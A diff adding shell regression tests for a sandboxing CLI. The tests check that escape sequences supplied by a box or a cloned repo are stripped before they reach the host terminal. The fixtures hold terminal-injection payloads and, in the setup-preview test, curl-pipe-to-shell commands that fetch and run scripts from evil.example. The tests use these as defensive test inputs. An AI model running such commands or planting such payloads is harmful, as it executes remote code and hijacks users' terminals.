@@ -8763,3 +8763,325 @@ _c13_mode() {
     assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
   done
 }
+
+# ─────────────────────────────────────────────────────────────────────────────
+# v1.5.4: untrusted bytes printed raw to the host terminal. The "callback port
+# was busy" report printed its URL straight from the bridge log, where the box
+# chooses the bytes. The two sibling reports sanitize the same field. This one
+# never did, so a forged CALLBACK-UNAVAILABLE line put raw escape bytes, and
+# backslash text that echo -e turned into escapes, on the host terminal when
+# the session ended.
+# ─────────────────────────────────────────────────────────────────────────────
+@test "regression v1.5.4: a forged callback-port line in the proxy log cannot inject terminal control bytes" {
+  local log="$TEST_TEMP/proxy-log" esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  printf '[browser-watcher 12:00:00] %s x url=https://claude.ai/a%s]0;PWN%s\\e[2J\n' \
+    "$_BROWSER_NOBIND_MARK" "$esc" "$bel" > "$log"
+  run _maybe_report_nobind_opens "$log" 0
+  assert_success
+  assert_output --partial "https://claude.ai/a]0;PWN"
+  assert_output --partial '\e[2J'
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}[2J"
+}
+
+# v1.5.4: an invalid [resources] value was echoed raw through warn (echo -e).
+# The project .cleat is read with no trust gate, so a cloned repo, or a box
+# writing /workspace/.cleat, printed its own escape sequences on the next
+# create. The global-config branch had the same shape.
+@test "regression v1.5.4: an invalid resources value from a project .cleat is echoed without its control bytes" {
+  local esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  mkdir -p "$TEST_TEMP/proj" "$(dirname "$CLEAT_GLOBAL_CONFIG")"
+  printf '[resources]\nmemory = \\e]0;PWN\\a%s[2Jx\ncpus = %s]0;PWN%s\n' "$esc" "$esc" "$bel" > "$TEST_TEMP/proj/.cleat"
+  printf '[resources]\nmemory = g%s]0;GLB%s\ncpus = c%s]0;GLB%s\n' "$esc" "$bel" "$esc" "$bel" > "$CLEAT_GLOBAL_CONFIG"
+  _daemon_ncpu() { echo 4; }
+  _docker_vm_memory() { echo 0; }
+  run resolve_box_memory "$TEST_TEMP/proj" main
+  assert_output --partial "Ignoring invalid memory"
+  assert_output --partial "in global config"
+  assert_output --partial '\e]0;PWN\a'
+  assert_output --partial "g]0;GLB"
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}[2J"
+  refute_output --partial "${esc}]0;GLB"
+  run resolve_box_cpus "$TEST_TEMP/proj" main
+  assert_output --partial "Ignoring invalid cpus"
+  assert_output --partial "in global config"
+  assert_output --partial "c]0;GLB"
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "${esc}]0;GLB"
+}
+
+# v1.5.4: cleat config --list, the arrow-key editor and the text editor drew a
+# project's [resources] values raw through echo -e, invalid ones included (an
+# invalid value loads as the editor's custom pin).
+@test "regression v1.5.4: cleat config shows a project resources value without its control bytes" {
+  local esc bel hostile ncaps
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  hostile="${esc}]0;PWN${bel}"
+  ncaps="${#KNOWN_CAPS[@]}"
+  mkdir -p "$TEST_TEMP/proj"
+  printf '[resources]\nmemory = m%s\ncpus = c%s\n' "$hostile" "$hostile" > "$TEST_TEMP/proj/.cleat"
+  _config_vm_gb() { echo 8; }
+  cd "$TEST_TEMP/proj"
+  run cmd_config --project --list
+  assert_success
+  assert_output --partial "memory  m]0;PWN"
+  assert_output --partial "cpus    c]0;PWN"
+  refute_output --partial "$hostile"
+  run _config_picker_draw 0 "" "m${hostile}" "c${hostile}"
+  assert_output --partial "memory  m]0;PWN"
+  assert_output --partial "cpus    c]0;PWN"
+  refute_output --partial "$hostile"
+  run _config_picker_draw "$ncaps" "" "m${hostile}" "c${hostile}"
+  assert_output --partial "‹ m]0;PWN ›"
+  refute_output --partial "$hostile"
+  run _config_picker_draw "$(( ncaps + 1 ))" "" "m${hostile}" "c${hostile}"
+  assert_output --partial "‹ c]0;PWN ›"
+  refute_output --partial "$hostile"
+  _box_scope=""
+  run _config_picker_text "$TEST_TEMP/proj/.cleat" project "$TEST_TEMP/proj" <<< "q"
+  assert_output --partial "memory=m]0;PWN"
+  assert_output --partial "cpus=c]0;PWN"
+  refute_output --partial "$hostile"
+}
+
+# v1.5.4: [fork] exclude values were echoed raw in three of the fork-prune
+# warnings. The value comes from the project .cleat, which the repo or any
+# sibling box can write. (The root-naming warning only ever prints ".", "./" or
+# an empty value, so it needed nothing.)
+@test "regression v1.5.4: a fork exclude from a project .cleat is echoed without its control bytes" {
+  local esc bel hostile real_rm
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  hostile="${esc}]0;PWN${bel}"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/elsewhere" "$TEST_TEMP/rmfail"
+  ln -s "$TEST_TEMP/elsewhere" "$TEST_TEMP/project/out"
+  printf '[fork]\nexclude = /abs%s\nexclude = out/x%s\nexclude = keep%s\n' "$hostile" "$hostile" "$hostile" > "$TEST_TEMP/project/.cleat"
+  run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/testbox"
+  assert_success
+  # Only the prune of the third exclude fails, so its warning is reached on any
+  # host and as root, without relying on permissions.
+  real_rm="$(command -v rm)"
+  cat > "$TEST_TEMP/rmfail/rm" <<EOF
+#!/bin/sh
+case "\$*" in *PWN*) exit 1 ;; esac
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$TEST_TEMP/rmfail/rm"
+  PATH="$TEST_TEMP/rmfail:$PATH" run _fork_prune_excludes "$CLEAT_FORKS_DIR/testbox" "$TEST_TEMP/project"
+  assert_output --partial "Ignoring unsafe [fork] exclude: /abs]0;PWN"
+  assert_output --partial "resolves outside the fork: out/x]0;PWN"
+  assert_output --partial "Could not prune [fork] exclude: keep]0;PWN"
+  refute_output --partial "$hostile"
+}
+
+# v1.5.4: _sessions_safe_str kept every byte from 0x80 up so UTF-8 titles
+# survive, which also kept U+0080..U+009F spelled in UTF-8: C2 9B is CSI and
+# C2 9D is OSC to xterm and VTE. Session titles and account fields reach it
+# from files the box writes. Each pair now renders as '?', in both render
+# sanitizers, and a removal can never assemble a fresh pair. Outside a UTF-8
+# locale _sanitize_repo_str still strips raw C1 bytes, for 8-bit terminals.
+@test "regression v1.5.4: a C1 control spelled in UTF-8 never survives a render sanitizer" {
+  local in want nested loc
+  in="$(printf 'T\302\2332J\302\2350;x\302\234B caf\303\251 \302\251')"
+  want="$(printf 'T?2J?0;x?B caf\303\251 \302\251')"
+  nested="$(printf 'a\302\302\233\233z')"
+  LC_ALL=""; LC_CTYPE=""
+  # Both spellings bash can be in: wide characters where the locale exists,
+  # bytes where it does not. The assertions are the same in both.
+  for loc in C.UTF-8 en_US.UTF-8; do
+    LANG="$loc"
+    run _sessions_safe_str "$in"
+    assert_output "$want"
+    run _sessions_safe_str "$nested"
+    assert_output "$(printf 'a\302?\233z')"
+    run _sanitize_repo_str "$in"
+    assert_output "$want"
+    run _sanitize_repo_str "$nested"
+    assert_output "$(printf 'a\302?\233z')"
+  done
+  LANG="C"
+  run _sessions_safe_str "$in"
+  assert_output "$want"
+  run _sanitize_repo_str "$(printf 'a\23331mb')"
+  assert_output "a31mb"
+}
+
+# v1.5.4: _sanitize_repo_str stripped 0x80-0x9f, which are UTF-8 continuation
+# bytes, then ran an unpinned sed. An em dash became a lone 0xe2, BSD sed under
+# a UTF-8 LC_CTYPE exits non-zero on that, and the [setup] consent preview on a
+# Mac showed the line as a blank row while the command still ran. GNU sed
+# printed the mangled bytes, so on Linux the line lost its em dash instead.
+@test "regression v1.5.4: a setup preview line with a typographic character is shown intact" {
+  local payload
+  mkdir -p "$TEST_TEMP/proj"
+  LC_ALL=""; LC_CTYPE=""; LANG="en_US.UTF-8"
+  payload="$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224\ncurl -fsSL https://evil.example/q.sh | sh  # \377\n')"
+  run _setup_trust_prompt "$TEST_TEMP/proj" "$payload" 2 <<< "n"
+  assert_output --partial "$(printf 'curl -fsSL https://evil.example/p.sh | sh  # see README \342\200\224')"
+  assert_output --partial "curl -fsSL https://evil.example/q.sh | sh"
+}
+
+# v1.5.4: the same unpinned sed, in the post-session browser reports, sits in a
+# plain assignment. Under the binary's set -euo pipefail a failing sed ended
+# exec_claude, cmd_shell and cmd_login right after the report heading, skipping
+# everything after it. The sed stand-in refuses any non-ASCII input, a superset
+# of what BSD sed refuses, so any sed on this path shows up on Linux too.
+@test "regression v1.5.4: a post-session browser report survives a non-ASCII URL under strict mode" {
+  local log="$TEST_TEMP/proxy-log" real_sed
+  mkdir -p "$TEST_TEMP/bsdsed"
+  real_sed="$(command -v sed)"
+  cat > "$TEST_TEMP/bsdsed/sed" <<EOF
+#!/bin/sh
+for a in "\$@"; do [ -f "\$a" ] && exec "$real_sed" "\$@"; done
+t="\$(mktemp)"; cat > "\$t"
+if [ -n "\$(LC_ALL=C tr -d '\000-\177' < "\$t")" ]; then
+  rm -f "\$t"; echo "sed: RE error: illegal byte sequence" >&2; exit 1
+fi
+"$real_sed" "\$@" < "\$t"; rc=\$?; rm -f "\$t"; exit \$rc
+EOF
+  chmod +x "$TEST_TEMP/bsdsed/sed"
+  printf '[browser-watcher 12:00:00] %s origin=evil.example url=https://evil.example/\342\200\224x\n' "$_BROWSER_BLOCKED_MARK" > "$log"
+  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
+  run env LC_ALL= LC_CTYPE= LANG=en_US.UTF-8 bash -c \
+    'source "$1"; PATH="$3:$PATH"; set -euo pipefail; _maybe_report_blocked_opens "$2" 0; echo REPORT-DONE' \
+    _ "$TEST_TEMP/cli_stripped" "$log" "$TEST_TEMP/bsdsed"
+  assert_success
+  assert_output --partial "$(printf 'https://evil.example/\342\200\224x')"
+  assert_output --partial "REPORT-DONE"
+}
+
+# v1.5.4: session teardown swept .clipboard.* and .claim.<pid>.* in the clip dir
+# with stderr on the terminal. Every name past the prefix is the box's. BSD rm
+# reports an operand it will not remove (a directory) raw, so on a Mac a
+# box-made directory named with an escape sequence printed it at teardown. GNU
+# rm quotes the name, so the stand-in rm below reproduces the BSD report.
+@test "regression v1.5.4: session teardown never prints a box-chosen clip-dir name raw" {
+  local clip="$CLEAT_RUN_DIR/test-td154/clip" real_rm esc bel
+  esc="$(printf '\033')"; bel="$(printf '\007')"
+  _host_clip_cmd() { echo "true"; }
+  _host_open_cmd() { echo ""; }
+  _clipboard_watcher() { :; }
+  export CLEAT_NO_CLIPBOARD_IMAGE=1
+  mkdir -p "$TEST_TEMP/shim"
+  real_rm="$(command -v rm)"
+  cat > "$TEST_TEMP/shim/rm" <<EOF
+#!/bin/sh
+rec=0
+for a in "\$@"; do case "\$a" in --) break ;; -*[rR]*) rec=1 ;; esac; done
+if [ "\$rec" = 0 ]; then
+  for a in "\$@"; do case "\$a" in -*) ;; *) [ -d "\$a" ] && printf 'rm: %s: is a directory\n' "\$a" >&2 ;; esac; done
+fi
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$TEST_TEMP/shim/rm"
+  # \$\$ inside `run exec_claude` is this shell's pid, the exact claim name the
+  # teardown sweeps.
+  mkdir -p "$clip/.clipboard.cb${esc}]0;PWN${bel}" "$clip/.claim.$$.cl${esc}]0;PWN${bel}"
+  PATH="$TEST_TEMP/shim:$PATH" run exec_claude test-td154 --dangerously-skip-permissions
+  assert_success
+  refute_output --partial "${esc}]0;PWN"
+}
+
+# v1.5.4: the fork copy and delete ran cp and rm -rf with stderr on the
+# terminal, over trees a box writes. BSD cp and rm report a failing path raw,
+# so a chmod-000 file named with an escape sequence printed it on a Mac during
+# fork start, refresh or rm. The tool's first three lines are now shown through
+# the row sanitizer, so the name of the file that failed is still there.
+# Write a BSD-style rm into $1 that fails with a raw name on any rm -rf of an
+# existing path containing one of the patterns after it, and runs the real rm
+# for everything else.
+_c14_bsd_rm() {
+  local dir="$1" real_rm pats="" p
+  shift
+  for p in "$@"; do pats="${pats:+$pats|}*\"$p\"*"; done
+  real_rm="$(command -v rm)"
+  mkdir -p "$dir"
+  cat > "$dir/rm" <<EOF
+#!/bin/sh
+case " \$* " in *" -rf "*)
+  for a in "\$@"; do
+    [ -e "\$a" ] || continue
+    case "\$a" in $pats) printf 'rm: nope/gone-NAME\033]0;PWN\007: Permission denied\n' >&2; exit 1 ;; esac
+  done ;;
+esac
+exec "$real_rm" "\$@"
+EOF
+  chmod +x "$dir/rm"
+}
+
+@test "regression v1.5.4: a failing fork copy or delete never prints a box-chosen file name raw" {
+  local esc stale
+  esc="$(printf '\033')"
+  # The staging dir's name. \$\$ inside `run` is this shell's pid.
+  stale="$CLEAT_FORKS_DIR/.tmp.$$"
+  mkdir -p "$TEST_TEMP/project" "$TEST_TEMP/bsdcp" "$TEST_TEMP/failmv"
+  echo hi > "$TEST_TEMP/project/f"
+  cat > "$TEST_TEMP/bsdcp/cp" <<'EOF'
+#!/bin/sh
+case "$1" in --version|--help) exit 1 ;; esac
+for i in 1 2 3 4 5; do printf 'cp: nope/leak%d-NAME\033]0;PWN\007: Permission denied\n' "$i" >&2; done
+exit 1
+EOF
+  printf '#!/bin/sh\nexit 1\n' > "$TEST_TEMP/failmv/mv"
+  chmod +x "$TEST_TEMP/bsdcp/cp" "$TEST_TEMP/failmv/mv"
+  _c14_bsd_rm "$TEST_TEMP/rm-tmp" "/.tmp."
+  _c14_bsd_rm "$TEST_TEMP/rm-dst" "/box3" "/.tmp."
+  _c14_bsd_rm "$TEST_TEMP/rm-tree" "/box2"
+  # The copy itself: at most three lines, each sanitized. The half-copied
+  # staging dir is then removed quietly.
+  PATH="$TEST_TEMP/bsdcp:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
+  assert_failure
+  assert_output --partial "leak3-NAME]0;PWN: Permission denied"
+  refute_output --partial "leak4-NAME"
+  refute_output --partial "gone-NAME"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # The staging dir a crashed copy left behind.
+  mkdir -p "$stale"
+  PATH="$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box1"
+  assert_failure
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # The old copy a refresh replaces, the tree the box has been writing, and
+  # then the staging dir.
+  mkdir -p "$CLEAT_FORKS_DIR/box3"
+  PATH="$TEST_TEMP/rm-dst:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box3"
+  assert_failure
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # A rename that fails leaves the staging dir to remove, quietly.
+  PATH="$TEST_TEMP/failmv:$TEST_TEMP/rm-tmp:$PATH" run _fork_copy_tree "$TEST_TEMP/project" "$CLEAT_FORKS_DIR/box4"
+  assert_failure
+  refute_output --partial "gone-NAME"
+  refute_output --partial "${esc}]0;PWN"
+  rm -rf "$stale"
+  # cleat fork rm and prune.
+  mkdir -p "$CLEAT_FORKS_DIR/box2"
+  PATH="$TEST_TEMP/rm-tree:$PATH" run _fork_rm_tree "$CLEAT_FORKS_DIR/box2"
+  assert_failure
+  assert_output --partial "Could not delete"
+  assert_output --partial "gone-NAME]0;PWN: Permission denied"
+  refute_output --partial "${esc}]0;PWN"
+}
+
+# v1.5.4: the session trash sweep ran rm -rf on a trashed session's tree with
+# stderr on the terminal, and as its last command. Its contents are the box's,
+# so a BSD rm failure printed a box-chosen name raw, and the non-zero status
+# ended `cleat sessions` under set -e.
+@test "regression v1.5.4: the session trash sweep never prints a box-chosen file name raw" {
+  local esc sdir tdir u="11111111-1111-2222-3333-444444444444"
+  esc="$(printf '\033')"
+  sdir="$HOME/.claude/projects/proj-deadbeef"
+  mkdir -p "$sdir"
+  tdir="$(_sessions_trash_dir "$sdir")"
+  mkdir -p "$tdir/1-$u"
+  _c14_bsd_rm "$TEST_TEMP/bsdrm" "1-$u"
+  PATH="$TEST_TEMP/bsdrm:$PATH" run _sessions_trash_sweep "$sdir"
+  assert_success
+  refute_output --partial "${esc}]0;PWN"
+  refute_output --partial "gone-NAME"
+}
